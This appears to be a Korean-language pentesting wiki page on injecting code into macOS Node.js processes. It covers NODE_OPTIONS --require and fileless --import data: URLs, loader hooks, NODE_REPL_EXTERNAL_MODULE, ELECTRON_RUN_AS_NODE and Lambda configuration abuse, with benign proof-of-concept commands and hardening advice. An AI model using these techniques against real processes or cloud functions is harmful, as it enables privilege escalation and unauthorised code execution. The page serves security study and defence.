# macOS Node.js 애플리케이션 Injection

{{#include ../../../banners/hacktricks-training.md}}

## 개요

공격자가 **Node.js**를 실행하게 되는 프로세스의 환경을 제어할 수 있다면(`node` 바이너리를 직접 실행하거나 `npm`, `npx`, `yarn`, `pnpm`, `eslint`, `tsc`, `next` 등 Node 기반 CLI를 실행하는 경우), 여러 환경 변수를 통해 런타임이 대상 프로그램 실행 전에 **공격자가 제어하는 JavaScript를 로드하고 실행**하도록 만들 수 있습니다. 이는 다른 런타임의 `PERL5OPT`/`RUBYOPT`/`_JAVA_OPTIONS` 계열과 동등한 code-execution primitive입니다.

preloaded code는 victim과 동일한 uid, 환경, file descriptors 및 entitlements를 사용하여 **동일한 process**에서 실행됩니다. 따라서 권한이 더 높은 process가 상속되었거나 공격자가 영향을 줄 수 있는 환경으로 Node를 실행하는 경우, 이는 깔끔한 injection/priv-esc vector가 됩니다.

## `NODE_OPTIONS` — `--require` (file-backed)

`NODE_OPTIONS`는 해당 내용이 추가 command-line flags인 것처럼 파싱됩니다. `--require` (`-r`)는 entry point **전에** CommonJS module을 preload하므로, 해당 module의 top-level code가 먼저 실행됩니다.<sup>[[1]](#references)</sup>
```bash
# Target script
echo "console.log('target script ran')" > /tmp/victim.js

# Attacker-controlled preload module
echo "require('fs').writeFileSync('/tmp/node-require-executed','x'); console.log('[require preload]')" > /tmp/preload.js

NODE_OPTIONS="--require /tmp/preload.js" node /tmp/victim.js
# [require preload]
# target script ran
```
## `NODE_OPTIONS` — `data:` URL을 사용하는 `--import` (fileless)

**Node 20.6**부터 `--import`는 `data:text/javascript,<code>` URL을 허용하므로, 디스크에 파일이나 module directory 없이 ES-module JavaScript를 inline으로 preload할 수 있습니다. 코드는 **완전히 URL-encoded**되어야 합니다(raw space 또는 `#`은 data URL을 잘라 `SyntaxError`를 발생시킵니다).<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Build a fully URL-encoded data: URL payload
node -e 'const js="import(\"fs\").then(f=>f.writeFileSync(\"/tmp/node-import-executed\",\"x\"));console.log(\"[import preload]\")"; console.log("data:text/javascript,"+encodeURIComponent(js))' > /tmp/dataurl.txt

NODE_OPTIONS="--import $(cat /tmp/dataurl.txt)" node /tmp/victim.js
# [import preload]
# target script ran
```
이는 cloud에서 악용되는 기법으로, 예를 들어 AWS Lambda 함수의 configuration에 `NODE_OPTIONS`를 주입하여(`lambda:UpdateFunctionConfiguration`, `iam:PassRole` 불필요) execution role 권한으로 code를 실행할 수 있습니다.

> [!TIP]
> `NODE_OPTIONS`는 code를 직접 실행할 수 없습니다. `--eval`/`-e`, `-p` 또는 script path와 같은 flag는 명시적으로 거부됩니다(`node: --eval is not allowed in NODE_OPTIONS`). 대신 `--require`/`--import`를 사용하여 code를 가리키십시오.

## `NODE_OPTIONS` — custom loaders / 기타 startup flag

`NODE_OPTIONS`는 attacker code를 실행하는 side effect가 있는 다른 startup 관련 flag도 따릅니다. 예를 들어 ESM loader hook이 있습니다:
```bash
# Node >= 20.6 (loader hooks run in a separate thread)
NODE_OPTIONS="--import ./hooks.mjs" node app.mjs
# Older Node
NODE_OPTIONS="--experimental-loader ./hooks.mjs" node app.mjs
```
Node 기반 launcher가 child `node`를 생성하면 일반적으로 **`NODE_OPTIONS`를 전파**하므로, 한 번 주입한 설정이 전체 toolchain(`npm run …`, `npx`, build tools, test runners, language servers)에 영향을 줄 수 있습니다.

## `NODE_REPL_EXTERNAL_MODULE`

Node가 **interactive REPL**을 시작하면 `NODE_REPL_EXTERNAL_MODULE`로 지정된 module을 로드하고 해당 module의 top-level code를 실행합니다. 이는 victim이 interactive `node`/`node -i` shell(dev tooling, maintenance consoles)을 실행할 때 유용합니다.<sup>[[3]](#references)</sup>
```bash
echo "require('fs').writeFileSync('/tmp/node-repl-executed','x'); module.exports={};" > /tmp/replmod.js
printf '.exit\n' | NODE_REPL_EXTERNAL_MODULE=/tmp/replmod.js node -i
ls -la /tmp/node-repl-executed
```
> [!WARNING]
> `NODE_REPL_EXTERNAL_MODULE`은 `kDisableNodeOptionsEnv` 보호 기능을 사용해 child를 spawn할 때 의도적으로 **무시**되지만, 직접 실행된 interactive REPL은 이를 적용합니다.

## Electron (`ELECTRON_RUN_AS_NODE`)

Electron applications는 **`ELECTRON_RUN_AS_NODE=1`**로 시작하면 전체 Node runtime을 다시 노출하며, 이때 위의 모든 `NODE_OPTIONS` vectors가 (대개 signed/entitled된) Electron binary에 적용됩니다. See:

{{#ref}}
macos-electron-applications-injection.md
{{#endref}}

## Other JS runtimes

- **Bun**은 호환성을 위해 `NODE_OPTIONS`를 읽으며, 자체 `--preload`를 지원합니다(`bunfig.toml`을 통해 구성 가능).
- **Deno**는 `NODE_OPTIONS`를 적용하지 않습니다. 대신 명시적인 flags(`--import`, `--preload`)가 필요하므로, inherited `NODE_OPTIONS`에는 취약하지 않습니다.

허용되는 flags는 releases에 따라 변경되므로, 항상 정확한 runtime과 version을 확인하세요.

## Hardening

- 더 privileged한 context에서 Node를 실행하기 전에 환경에서 `NODE_OPTIONS`, `NODE_REPL_EXTERNAL_MODULE`, `ELECTRON_RUN_AS_NODE`를 제거하고, sanitized environment로 child를 spawn하세요.
- target의 environment를 설정할 수 있는 능력(config injection, `launchd`/`launchctl setenv`, plist/`EnvironmentVariables`, CI variables, Lambda/container config)을 해당 target이 실행하는 모든 Node process에서 code execution과 동등한 것으로 취급하세요.
- [Shield](https://github.com/theevilbit/Shield)가 `ELECTRON_RUN_AS_NODE` 및 dyld injection variables에 대해 alert하는 것과 동일한 방식으로 이러한 variables에 대한 process exec을 monitor하세요.

## References

- [1] [Node.js CLI 문서 — `NODE_OPTIONS`, `--require`, `--import`](https://nodejs.org/api/cli.html#node_optionsoptions)
- [2] [Node.js ESM — `--import` 및 `data:` URLs](https://nodejs.org/api/esm.html#data-imports)
- [3] [Node.js REPL — `NODE_REPL_EXTERNAL_MODULE`](https://nodejs.org/api/repl.html#environment-variable-options)
{{#include ../../../banners/hacktricks-training.md}}
